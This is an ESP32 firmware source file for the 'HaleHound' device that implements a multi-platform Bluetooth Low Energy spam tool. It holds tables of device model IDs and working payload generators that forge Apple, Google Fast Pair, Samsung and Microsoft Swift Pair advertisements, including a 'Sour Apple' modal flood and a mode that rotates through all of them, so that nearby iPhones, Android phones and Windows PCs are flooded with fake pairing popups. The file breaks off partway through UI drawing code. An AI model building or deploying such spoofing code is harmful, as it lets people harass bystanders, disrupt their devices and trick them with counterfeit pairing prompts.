// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD Bluetooth Attack Modules Implementation
// BLE Spoofer - Apple Device Popup Spam
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "bluetooth_attacks.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "icon.h"
#include "nrf24_config.h"
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <SPI.h>
#include "esp_gap_ble_api.h"
#include "esp_gatts_api.h"
#include "esp_bt_main.h"
#include "esp_bt.h"
#include "esp_wifi.h"
#include <WiFi.h>
#include "skull_bg.h"
#include "ble_database.h"
#include <SD.h>
#include "spi_manager.h"
#include "wp_loot_viewer.h"
#include "gps_module.h"

// ── Classic BT memory release ───────────────────────────────────────────
// ESP32 Bluedroid reserves ~28KB for Classic BT by default.
// HaleHound only uses BLE — release that memory once, permanently.
// Must be called BEFORE BLEDevice::init() triggers esp_bt_controller_init().
static bool g_classicBtReleased = false;
static void releaseClassicBtMemory() {
    if (!g_classicBtReleased) {
        esp_err_t err = esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
        if (err == ESP_OK) {
            g_classicBtReleased = true;
            Serial.printf("[BLE] Classic BT memory released OK, heap: %u\n", ESP.getFreeHeap());
        } else {
            Serial.printf("[BLE] mem_release FAILED: 0x%x, heap: %u\n", err, ESP.getFreeHeap());
            // Don't set flag — try again next time
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// BLE SPOOFER - Multi-Platform BLE Spam Engine
// Targets: Apple iOS, Google Android, Samsung Galaxy, Microsoft Windows
// 7 Modes: Apple Popup, Sour Apple, Fast Pair, Samsung Buds,
//          Samsung Watch, Swift Pair, CHAOS (rotates all)
// Created: 2026-02-14 - Full rebuild with multi-platform support
// ═══════════════════════════════════════════════════════════════════════════

namespace BleSpoofer {

// ═══════════════════════════════════════════════════════════════════════════
// SPAM MODES
// ═══════════════════════════════════════════════════════════════════════════

enum SpamMode {
    MODE_APPLE_POPUP = 0,
    MODE_SOUR_APPLE,
    MODE_FAST_PAIR,
    MODE_SAMSUNG_BUDS,
    MODE_SAMSUNG_WATCH,
    MODE_SWIFT_PAIR,
    MODE_CHAOS,
    MODE_COUNT  // 7
};

static const char* MODE_NAMES[] = {
    "APPLE POPUP",
    "SOUR APPLE",
    "FAST PAIR",
    "SAMSUNG BUDS",
    "SAMSUNG WATCH",
    "SWIFT PAIR",
    "CHAOS"
};

static const char* MODE_TARGETS[] = {
    "iOS",
    "iOS",
    "Android",
    "Android",
    "Android",
    "Windows",
    "ALL"
};

// ═══════════════════════════════════════════════════════════════════════════
// APPLE POPUP - Proximity Pairing (Type 0x07)
// Triggers "Your [Device] is nearby" popup on iPhones/iPads
// Model byte at offset 7 in proximity pairing payload
// ═══════════════════════════════════════════════════════════════════════════

#define APPLE_COUNT 20

static const uint8_t APPLE_MODELS[APPLE_COUNT] = {
    0x02,  // AirPods
    0x0E,  // AirPods Pro
    0x0A,  // AirPods Max
    0x0F,  // AirPods Gen 2
    0x13,  // AirPods Gen 3
    0x14,  // AirPods Pro Gen 2
    0x19,  // AirPods 4
    0x24,  // AirPods Max USB-C
    0x03,  // PowerBeats 3
    0x0B,  // PowerBeats Pro
    0x0C,  // Beats Solo Pro
    0x11,  // Beats Studio Buds
    0x10,  // Beats Flex
    0x05,  // BeatsX
    0x06,  // Beats Solo 3
    0x09,  // Beats Studio 3
    0x17,  // Beats Studio Pro
    0x12,  // Beats Fit Pro
    0x16,  // Beats Studio Buds+
    0x1C   // PowerBeats Pro 2
};

static const char* APPLE_NAMES[APPLE_COUNT] = {
    "AirPods",
    "AirPods Pro",
    "AirPods Max",
    "AirPods Gen2",
    "AirPods Gen3",
    "AirPods Pro2",
    "AirPods 4",
    "AirPods MaxC",
    "PowerBeats3",
    "PowerBeatsPro",
    "Solo Pro",
    "Studio Buds",
    "Beats Flex",
    "BeatsX",
    "Beats Solo3",
    "Beats Studio3",
    "Studio Pro",
    "Beats FitPro",
    "Studio Buds+",
    "PBeatsPro2"
};

// ═══════════════════════════════════════════════════════════════════════════
// SOUR APPLE - Nearby Action (Type 0x0F)
// Floods iOS with random action modals (WiFi, AirDrop, HomeKit, etc.)
// ═══════════════════════════════════════════════════════════════════════════

#define SOUR_APPLE_COUNT 14

static const uint8_t SOUR_APPLE_TYPES[SOUR_APPLE_COUNT] = {
    0x01,  // Setup New iPhone
    0x02,  // Transfer Number
    0x05,  // AirDrop
    0x06,  // HomeKit
    0x09,  // WiFi Password
    0x0D,  // AirPlay
    0x14,  // AppleTV Setup
    0x1E,  // Handoff
    0x20,  // Setup AppleTV
    0x27,  // Setup Device
    0x2B,  // Connect to WiFi
    0x2D,  // Apple Vision Pro
    0x2F,  // HomePod Setup
    0xC0   // Setup Nearby
};

static const char* SOUR_APPLE_NAMES[SOUR_APPLE_COUNT] = {
    "New iPhone",
    "Transfer #",
    "AirDrop",
    "HomeKit",
    "WiFi Pass",
    "AirPlay",
    "AppleTV",
    "Handoff",
    "Setup ATV",
    "Setup Dev",
    "WiFi Net",
    "VisionPro",
    "HomePod",
    "Nearby"
};

// ═══════════════════════════════════════════════════════════════════════════
// GOOGLE FAST PAIR (Service UUID 0xFE2C)
// Triggers "Device ready to pair" notification on Android
// 3-byte Model ID determines device name/image in popup
// ═══════════════════════════════════════════════════════════════════════════

#define FAST_PAIR_COUNT 15

static const uint8_t FAST_PAIR_MODELS[FAST_PAIR_COUNT][3] = {
    {0xD9, 0x93, 0x30},  // Pixel Buds Pro
    {0x82, 0x1F, 0x66},  // Pixel Buds A-Series
    {0x71, 0x7F, 0x41},  // Pixel Buds
    {0xF5, 0x24, 0x94},  // Sony WH-1000XM4
    {0xF0, 0x09, 0x17},  // Sony WH-1000XM5
    {0x01, 0x00, 0x06},  // Bose NC 700
    {0xEF, 0x44, 0x63},  // Bose QC Ultra
    {0x03, 0x1E, 0x06},  // JBL Flip 6
    {0x92, 0xB2, 0x5E},  // JBL Live Pro 2
    {0x1E, 0x89, 0xA7},  // Razer Hammerhead
    {0x02, 0xAA, 0x91},  // Jabra Elite 75t
    {0x2D, 0x7A, 0x23},  // Nothing Ear (1)
    {0xD4, 0x46, 0xA7},  // Sony LinkBuds S
    {0x72, 0xEF, 0x62},  // Samsung Galaxy Buds FE
    {0xF5, 0x8D, 0x14}   // JBL Buds Pro
};

static const char* FAST_PAIR_NAMES[FAST_PAIR_COUNT] = {
    "Pixel BudsPro",
    "Pixel BudsA",
    "Pixel Buds",
    "Sony XM4",
    "Sony XM5",
    "Bose NC700",
    "Bose QC Ultra",
    "JBL Flip 6",
    "JBL LivePro2",
    "Razer HH",
    "Jabra 75t",
    "Nothing Ear1",
    "Sony LinkBuds",
    "Galaxy BudFE",
    "JBL BudsPro"
};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG BUDS (Company ID 0x0075)
// Triggers Samsung EasySetup pairing popup on Galaxy phones
// 3-byte Device ID split with 0x01 separator in packet
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_BUDS_COUNT 20

static const uint8_t SAMSUNG_BUDS_IDS[SAMSUNG_BUDS_COUNT][3] = {
    {0xEE, 0x7A, 0x01},  // Galaxy Buds (2019)
    {0x9B, 0x7A, 0x01},  // Galaxy Buds+
    {0x9B, 0x7A, 0x02},  // Galaxy Buds+ Black
    {0x4E, 0x85, 0x01},  // Galaxy Buds Live
    {0x4E, 0x85, 0x02},  // Galaxy Buds Live Black
    {0x4E, 0x85, 0x03},  // Galaxy Buds Live White
    {0xA7, 0x2F, 0x01},  // Galaxy Buds Pro
    {0xA7, 0x2F, 0x02},  // Galaxy Buds Pro Silver
    {0xA7, 0x2F, 0x03},  // Galaxy Buds Pro Violet
    {0x74, 0x87, 0x01},  // Galaxy Buds2
    {0x74, 0x87, 0x02},  // Galaxy Buds2 White
    {0x74, 0x87, 0x03},  // Galaxy Buds2 Purple
    {0xAE, 0x59, 0x01},  // Galaxy Buds2 Pro
    {0xAE, 0x59, 0x02},  // Galaxy Buds2 Pro White
    {0xAE, 0x59, 0x03},  // Galaxy Buds2 Pro Gray
    {0x53, 0xD4, 0x01},  // Galaxy Buds FE
    {0x53, 0xD4, 0x02},  // Galaxy Buds FE White
    {0xB6, 0xC4, 0x01},  // Galaxy Buds3
    {0xB6, 0xC4, 0x02},  // Galaxy Buds3 Pro
    {0x11, 0xA0, 0x01}   // Galaxy Buds+ Rose
};

static const char* SAMSUNG_BUDS_NAMES[SAMSUNG_BUDS_COUNT] = {
    "Galaxy Buds",
    "Galaxy Buds+",
    "Buds+ Black",
    "Buds Live",
    "Buds Live B",
    "Buds Live W",
    "Buds Pro",
    "Buds Pro S",
    "Buds Pro V",
    "Buds2",
    "Buds2 White",
    "Buds2 Purple",
    "Buds2 Pro",
    "Buds2 Pro W",
    "Buds2 Pro G",
    "Buds FE",
    "Buds FE W",
    "Buds3",
    "Buds3 Pro",
    "Buds+ Rose"
};

// Samsung Buds fixed header and tail bytes for EasySetup protocol
static const uint8_t SAMSUNG_BUDS_HDR[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
static const uint8_t SAMSUNG_BUDS_TAIL[] = {0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00};

// ═══════════════════════════════════════════════════════════════════════════
// SAMSUNG WATCH (Company ID 0x0075)
// Triggers Samsung Watch pairing popup on Galaxy phones
// 1-byte Watch Model ID
// ═══════════════════════════════════════════════════════════════════════════

#define SAMSUNG_WATCH_COUNT 25

static const uint8_t SAMSUNG_WATCH_IDS[SAMSUNG_WATCH_COUNT] = {
    0x01,  // Galaxy Watch4 40mm
    0x02,  // Galaxy Watch4 44mm
    0x03,  // Galaxy Watch4 Classic 42mm
    0x04,  // Galaxy Watch4 Classic 46mm
    0x05,  // Galaxy Watch5 40mm
    0x06,  // Galaxy Watch5 44mm
    0x07,  // Galaxy Watch5 Pro 45mm
    0x08,  // Galaxy Watch6 40mm
    0x09,  // Galaxy Watch6 44mm
    0x0A,  // Galaxy Watch6 Classic 43mm
    0x0B,  // Galaxy Watch6 Classic 47mm
    0x0C,  // Galaxy Watch FE
    0x0D,  // Galaxy Watch Ultra
    0x0E,  // Galaxy Watch4 LTE
    0x0F,  // Galaxy Watch5 LTE
    0x10,  // Galaxy Watch6 LTE
    0x11,  // Galaxy Watch Active2 40mm
    0x12,  // Galaxy Watch Active2 44mm
    0x13,  // Galaxy Watch3 41mm
    0x14,  // Galaxy Watch3 45mm
    0x15,  // Galaxy Watch3 Active 41mm
    0x16,  // Galaxy Fit2
    0x17,  // Galaxy Fit3
    0x18,  // Galaxy Watch7 40mm
    0x19   // Galaxy Watch7 44mm
};

static const char* SAMSUNG_WATCH_NAMES[SAMSUNG_WATCH_COUNT] = {
    "Watch4 40",
    "Watch4 44",
    "Watch4C 42",
    "Watch4C 46",
    "Watch5 40",
    "Watch5 44",
    "Watch5 Pro",
    "Watch6 40",
    "Watch6 44",
    "Watch6C 43",
    "Watch6C 47",
    "Watch FE",
    "Watch Ultra",
    "Watch4 LTE",
    "Watch5 LTE",
    "Watch6 LTE",
    "Active2 40",
    "Active2 44",
    "Watch3 41",
    "Watch3 45",
    "Watch3A 41",
    "Fit2",
    "Fit3",
    "Watch7 40",
    "Watch7 44"
};

// Samsung Watch fixed header for pairing protocol
static const uint8_t SAMSUNG_WATCH_HDR[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};

// ═══════════════════════════════════════════════════════════════════════════
// MICROSOFT SWIFT PAIR (Company ID 0x0006)
// Triggers "New Bluetooth device found" on Windows 10/11
// Device name as ASCII string in advertisement
// ═══════════════════════════════════════════════════════════════════════════

#define SWIFT_PAIR_COUNT 10

static const char* SWIFT_PAIR_NAMES[SWIFT_PAIR_COUNT] = {
    "HH Speaker",
    "BT Mouse",
    "BT Keyboard",
    "Headphones",
    "Controller",
    "Earbuds",
    "Smart Watch",
    "Fitness",
    "BT Adapter",
    "Soundbar"
};

// ═══════════════════════════════════════════════════════════════════════════
// DEVICE COUNTS PER MODE
// ═══════════════════════════════════════════════════════════════════════════

static const int MODE_DEVICE_COUNTS[] = {
    APPLE_COUNT,          // 20
    SOUR_APPLE_COUNT,     // 14
    FAST_PAIR_COUNT,      // 15
    SAMSUNG_BUDS_COUNT,   // 20
    SAMSUNG_WATCH_COUNT,  // 25
    SWIFT_PAIR_COUNT,     // 10
    0                     // CHAOS uses all
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static volatile bool spamming = false;
static bool exitRequested = false;
static volatile int currentMode = MODE_APPLE_POPUP;
static int initialMode = -1;

static volatile uint32_t packetCount = 0;
static volatile uint32_t rateWindowCount = 0;
static volatile uint16_t currentRate = 0;

// Per-mode device index (persists when switching modes)
static volatile int deviceIndex[MODE_COUNT] = {0};
static int chaosStep = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// Core 0: BLE broadcast engine (doBroadcast loop)
// Core 1: Display + touch (Arduino main loop)
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t spamTaskHandle = NULL;
static volatile bool spamTaskRunning = false;

// ═══════════════════════════════════════════════════════════════════════════
// SCROLLING BROADCAST LOG
// ═══════════════════════════════════════════════════════════════════════════

#define SP_LOG_MAX_LINES 12
#define SP_LOG_LINE_HEIGHT SCALE_H(12)
#define SP_LOG_START_Y SCALE_Y(95)
#define SP_LOG_END_Y (tft.height() - SCALE_H(80))

static char logLines[SP_LOG_MAX_LINES][42];  // Fixed char buffers (no heap alloc)
static uint16_t logColors[SP_LOG_MAX_LINES];
static volatile int logCount = 0;
static volatile bool logDirty = false;  // Core 0 sets via addLogEntry, Core 1 reads in drawLog

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ANIMATION - 2 rows of 8 (matches BLE Jammer pattern)
// ═══════════════════════════════════════════════════════════════════════════

#define SP_SKULL_Y (SCREEN_HEIGHT - SCALE_H(48))
#define SP_SKULL_ROWS 1
#define SP_SKULL_ROW_SPACING SCALE_H(15)
#define SP_SKULL_NUM 8

static int skullFrame = 0;
static const unsigned char* spSkulls[SP_SKULL_NUM] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 6 icons
// Back(10) | Toggle(60) | PrevMode(105) | NextMode(140) | PrevDev(180) | NextDev(215)
// ═══════════════════════════════════════════════════════════════════════════

#define SP_ICON_SIZE 16
#define SP_ICON_NUM 6

static const int spIconX[SP_ICON_NUM] = {SCALE_X(10), SCALE_X(60), SCALE_X(105), SCALE_X(140), SCALE_X(180), SCALE_X(215)};
static const unsigned char* spIcons[SP_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back/Exit
    bitmap_icon_start,             // 1: Toggle spam ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Previous mode
    bitmap_icon_sort_up_plus,      // 3: Next mode
    bitmap_icon_LEFT,              // 4: Previous device
    bitmap_icon_RIGHT              // 5: Next device
};

static unsigned long lastDisplayUpdate = 0;

// ═══════════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static int getDeviceCount(int mode) {
    if (mode < 0 || mode >= MODE_COUNT) return 0;
    return MODE_DEVICE_COUNTS[mode];
}

static const char* getDeviceName(int mode, int idx) {
    switch (mode) {
        case MODE_APPLE_POPUP:   return (idx >= 0 && idx < APPLE_COUNT) ? APPLE_NAMES[idx] : "?";
        case MODE_SOUR_APPLE:    return (idx >= 0 && idx < SOUR_APPLE_COUNT) ? SOUR_APPLE_NAMES[idx] : "?";
        case MODE_FAST_PAIR:     return (idx >= 0 && idx < FAST_PAIR_COUNT) ? FAST_PAIR_NAMES[idx] : "?";
        case MODE_SAMSUNG_BUDS:  return (idx >= 0 && idx < SAMSUNG_BUDS_COUNT) ? SAMSUNG_BUDS_NAMES[idx] : "?";
        case MODE_SAMSUNG_WATCH: return (idx >= 0 && idx < SAMSUNG_WATCH_COUNT) ? SAMSUNG_WATCH_NAMES[idx] : "?";
        case MODE_SWIFT_PAIR:    return (idx >= 0 && idx < SWIFT_PAIR_COUNT) ? SWIFT_PAIR_NAMES[idx] : "?";
        case MODE_CHAOS:         return "CHAOS";
        default:                 return "?";
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PAYLOAD GENERATORS
// ═══════════════════════════════════════════════════════════════════════════

// Apple Proximity Pairing (Type 0x07) - triggers iOS "nearby device" popup
static void getApplePopupPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    pkt[0]  = 0x1E;  // AD Length (30 bytes follow)
    pkt[1]  = 0xFF;  // Manufacturer Specific Data
    pkt[2]  = 0x4C;  // Apple Inc (low byte)
    pkt[3]  = 0x00;  // Apple Inc (high byte)
    pkt[4]  = 0x07;  // Proximity Pairing type
    pkt[5]  = 0x19;  // Data length (25)
    pkt[6]  = 0x07;  // Prefix
    pkt[7]  = APPLE_MODELS[idx % APPLE_COUNT];  // Model byte
    pkt[8]  = 0x20;  // Common
    pkt[9]  = 0x75;  // Status
    pkt[10] = 0xAA;  // Battery
    pkt[11] = 0x30;  // Case
    pkt[12] = 0x01;  // Lid
    pkt[13] = 0x00;  // Color
    pkt[14] = 0x00;
    // Fill remaining 16 bytes with random data (makes each packet unique)
    esp_fill_random(&pkt[15], 16);
    advData.addData(std::string((char*)pkt, 31));
}

// Sour Apple Nearby Action (Type 0x0F) - floods iOS with action modals
static void getSourApplePayload(BLEAdvertisementData& advData, int typeIdx) {
    uint8_t pkt[17];
    int i = 0;
    pkt[i++] = 16;    // AD Length (16 bytes follow)
    pkt[i++] = 0xFF;  // Manufacturer Specific Data
    pkt[i++] = 0x4C;  // Apple Inc
    pkt[i++] = 0x00;
    pkt[i++] = 0x0F;  // Nearby Action type
    pkt[i++] = 0x05;  // Length
    pkt[i++] = 0xC1;  // Action flags
    pkt[i++] = SOUR_APPLE_TYPES[typeIdx % SOUR_APPLE_COUNT];
    // Random authentication tag (3 bytes)
    esp_fill_random(&pkt[i], 3);
    i += 3;
    pkt[i++] = 0x00;
    pkt[i++] = 0x00;
    pkt[i++] = 0x10;
    // Random tail (3 bytes)
    esp_fill_random(&pkt[i], 3);
    advData.addData(std::string((char*)pkt, 17));
}

// Google Fast Pair (Service UUID 0xFE2C) - triggers Android pairing notification
static void getFastPairPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[14];
    int i = 0;
    // Flags AD structure
    pkt[i++] = 0x02;  // Length
    pkt[i++] = 0x01;  // Flags type
    pkt[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    // Complete List of 16-bit Service UUIDs
    pkt[i++] = 0x03;  // Length
    pkt[i++] = 0x03;  // Complete 16-bit UUID list type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    // Service Data (FE2C + 3-byte Model ID)
    pkt[i++] = 0x06;  // Length
    pkt[i++] = 0x16;  // Service Data type
    pkt[i++] = 0x2C;  // FE2C (little-endian low)
    pkt[i++] = 0xFE;  // FE2C (little-endian high)
    const uint8_t* model = FAST_PAIR_MODELS[idx % FAST_PAIR_COUNT];
    pkt[i++] = model[0];
    pkt[i++] = model[1];
    pkt[i++] = model[2];
    advData.addData(std::string((char*)pkt, 14));
}

// Samsung Galaxy Buds (Company ID 0x0075) - triggers Samsung EasySetup popup
static void getSamsungBudsPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[31];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = 0x1B;  // AD Length = 27 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    // Fixed EasySetup header (10 bytes)
    memcpy(&pkt[i], SAMSUNG_BUDS_HDR, 10);
    i += 10;
    // Device ID with 0x01 separator (4 bytes from 3-byte ID)
    const uint8_t* id = SAMSUNG_BUDS_IDS[idx % SAMSUNG_BUDS_COUNT];
    pkt[i++] = id[0];
    pkt[i++] = id[1];
    pkt[i++] = 0x01;  // Separator
    pkt[i++] = id[2];
    // Fixed EasySetup tail (10 bytes)
    memcpy(&pkt[i], SAMSUNG_BUDS_TAIL, 10);
    i += 10;
    advData.addData(std::string((char*)pkt, 31));
}

// Samsung Galaxy Watch (Company ID 0x0075) - triggers Samsung Watch pairing popup
static void getSamsungWatchPayload(BLEAdvertisementData& advData, int idx) {
    uint8_t pkt[18];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = 0x0E;  // AD Length = 14 bytes follow
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x75;  // Samsung company ID (low)
    pkt[i++] = 0x00;  // Samsung company ID (high)
    // Fixed watch pairing header (10 bytes)
    memcpy(&pkt[i], SAMSUNG_WATCH_HDR, 10);
    i += 10;
    // Watch model ID (1 byte)
    pkt[i++] = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_COUNT];
    advData.addData(std::string((char*)pkt, 18));
}

// Microsoft Swift Pair (Company ID 0x0006) - triggers Windows "device found" popup
static void getSwiftPairPayload(BLEAdvertisementData& advData, int idx) {
    const char* name = SWIFT_PAIR_NAMES[idx % SWIFT_PAIR_COUNT];
    int nameLen = strlen(name);
    if (nameLen > 20) nameLen = 20;  // Stay within 31-byte total limit

    uint8_t pkt[31];
    int i = 0;
    // Flags
    pkt[i++] = 0x02;
    pkt[i++] = 0x01;
    pkt[i++] = 0x06;
    // Manufacturer Specific Data
    pkt[i++] = (uint8_t)(6 + nameLen);  // AD Length
    pkt[i++] = 0xFF;  // Manufacturer Specific Data type
    pkt[i++] = 0x06;  // Microsoft company ID (low)
    pkt[i++] = 0x00;  // Microsoft company ID (high)
    pkt[i++] = 0x03;  // Swift Pair beacon type
    pkt[i++] = 0x00;  // Sub-scenario: LE only
    pkt[i++] = 0x80;  // Display name flag
    // Device name as ASCII
    memcpy(&pkt[i], name, nameLen);
    i += nameLen;
    advData.addData(std::string((char*)pkt, i));
}


// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS — Enhanced HaleHound Visual Suite
// FreeFont titles, double-border frames, skull watermark, gradient bars,
// pulsing status, activity EQ, broadcast flash effects
// ═══════════════════════════════════════════════════════════════════════════

// Free Fonts are included via TFT_eSPI when LOAD_GFXFF is enabled
// Available: FreeMonoBold9pt7b, FreeMonoBold12pt7b, FreeMonoBold18pt7b

// Activity EQ bars — 16 skinny bars that bounce with broadcast activity
#define SP_EQ_BARS 16
#define SP_EQ_HEIGHT SCALE_H(22)
#define SP_EQ_Y (SCREEN_HEIGHT - SCALE_H(73))       // Just above skulls
#define SP_EQ_X SCALE_X(12)
#define SP_EQ_WIDTH (SCREEN_WIDTH - SCALE_X(24))
static uint8_t eqHeat[SP_EQ_BARS] = {0};

// Pulsing status blink state
static bool statusBlink = false;

// Helper: draw centered FreeFont text
static void spDrawFreeFont(int y, const char* text, uint16_t color, const GFXfont* font) {
    tft.setFreeFont(font);
    tft.setTextColor(color, TFT_BLACK);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;
    tft.setCursor(x, y);
    tft.print(text);
    tft.setFreeFont(NULL);
}

// Helper: gradient color from cyan to hot pink (ratio 0.0 → 1.0)
static uint16_t spGradientColor(float ratio) {
    if (ratio > 1.0f) ratio = 1.0f;
    if (ratio < 0.0f) ratio = 0.0f;
    uint8_t r = (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
    return tft.color565(r, g, b);
}

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < SP_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        if (i == 1 && spamming) color = HALEHOUND_HOTPINK;  // Toggle icon hot when active
        tft.drawBitmap(spIconX[i], ICON_BAR_Y, spIcons[i], SP_ICON_SIZE, SP_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void drawHeader() {
    tft.fillRect(0, SCALE_Y(40), SCREEN_WIDTH, SCALE_H(52), TFT_BLACK);

    // Skull watermark behind header (subtle dark cyan)
    tft.drawBitmap(SCALE_X(180), SCALE_Y(40), bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 30, 40));

    // Title — Nosifer with glitch effect
    drawGlitchText(SCALE_Y(60), "BLE SPOOFER", &Nosifer_Regular10pt7b);

    // Status — pulsing when active
    tft.setTextSize(1);
    if (spamming) {
        statusBlink = !statusBlink;
        uint16_t statusColor = statusBlink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
        tft.setTextColor(statusColor, TFT_BLACK);
        tft.setCursor(SCALE_X(88), SCALE_Y(68));
        tft.print(">> ACTIVE <<");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.setCursor(SCALE_X(95), SCALE_Y(68));
        tft.print("- IDLE -");
    }

    // Mode — in rounded double-border frame
    tft.drawRoundRect(5, SCALE_Y(74), GRAPH_PADDED_W, SCALE_H(16), 3, HALEHOUND_VIOLET);
    tft.drawRoundRect(6, SCALE_Y(75), GRAPH_PADDED_W - 2, SCALE_H(14), 2, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(SCALE_X(10), SCALE_Y(78));
    tft.printf(" %s", MODE_NAMES[currentMode]);

    // Device name + platform target on right side of frame
    if (currentMode == MODE_CHAOS) {
        tft.setCursor(SCALE_X(150), SCALE_Y(78));
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.print("[ALL]");
    } else {
        int devCount = getDeviceCount(currentMode);
        if (devCount > 0) {
            // Truncate device name to fit
            char devBuf[22];
            snprintf(devBuf, sizeof(devBuf), "%s", getDeviceName(currentMode, deviceIndex[currentMode]));
            tft.setCursor(SCALE_X(130), SCALE_Y(78));
            tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
            tft.print(devBuf);
        }
    }

    tft.drawLine(0, SCALE_Y(92), SCREEN_WIDTH, SCALE_Y(92), HALEHOUND_HOTPINK);
}

static void addLogEntry(const char* text, uint16_t color) {
    // Scroll up if buffer is full
    if (logCount >= SP_LOG_MAX_LINES) {
        memmove(logLines[0], logLines[1], (SP_LOG_MAX_LINES - 1) * sizeof(logLines[0]));
        memmove(logColors, logColors + 1, (SP_LOG_MAX_LINES - 1) * sizeof(uint16_t));
        logCount = SP_LOG_MAX_LINES - 1;
    }

    strncpy(logLines[logCount], text, sizeof(logLines[0]) - 1);
    logLines[logCount][sizeof(logLines[0]) - 1] = '\0';
    logColors[logCount] = color;
    logCount++;
    logDirty = true;  // Display update happens in loop() at 10fps
}

// Redraw log area — only called from display update section (10fps)
static void drawLog() {
    if (!logDirty) return;
    logDirty = false;

    tft.fillRect(0, SP_LOG_START_Y, SCREEN_WIDTH, SP_LOG_END_Y - SP_LOG_START_Y, TFT_BLACK);

    // Subtle skull watermark behind log (very dark)
    tft.drawBitmap(SCALE_X(112), SCALE_Y(155), bitmap_icon_skull_bluetooth, 16, 16, tft.color565(0, 18, 25));

    tft.setTextSize(1);
    for (int i = 0; i < logCount; i++) {
        tft.setTextColor(logColors[i], TFT_BLACK);
        tft.setCursor(3, SP_LOG_START_Y + i * SP_LOG_LINE_HEIGHT);
        tft.print(logLines[i]);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// ACTIVITY EQUALIZER — 16 bars that react to broadcast activity
// Cyan-to-hot-pink gradient, bounces when spamming, decays when idle
// ═══════════════════════════════════════════════════════════════════════════

static void updateEqHeat() {
    if (spamming) {
        // Spike random bars on each frame — simulates broadcast energy
        for (int i = 0; i < SP_EQ_BARS; i++) {
            // Each bar has a chance to spike
            if (random(100) < 60) {
                int spike = 60 + random(65);  // 60-124
                eqHeat[i] = (eqHeat[i] + spike) / 2;
            } else {
                // Gentle decay
                eqHeat[i] = eqHeat[i] * 3 / 4;
            }
            if (eqHeat[i] > 124) eqHeat[i] = 124;
        }
    } else {
        // Fast decay when stopped
        for (int i = 0; i < SP_EQ_BARS; i++) {
            eqHeat[i] = eqHeat[i] / 2;
        }
    }
}

static void drawEqualizer() {
    updateEqHeat();

    int barWidth = SP_EQ_WIDTH / SP_EQ_BARS;
    int maxBarH = SP_EQ_HEIGHT - 4;

    // Clear EQ area
    tft.fillRect(SP_EQ_X - 1, SP_EQ_Y, SP_EQ_WIDTH + 2, SP_EQ_HEIGHT, TFT_BLACK);

    // Frame around EQ
    tft.drawRect(SP_EQ_X - 2, SP_EQ_Y - 1, SP_EQ_WIDTH + 4, SP_EQ_HEIGHT + 2, HALEHOUND_GUNMETAL);

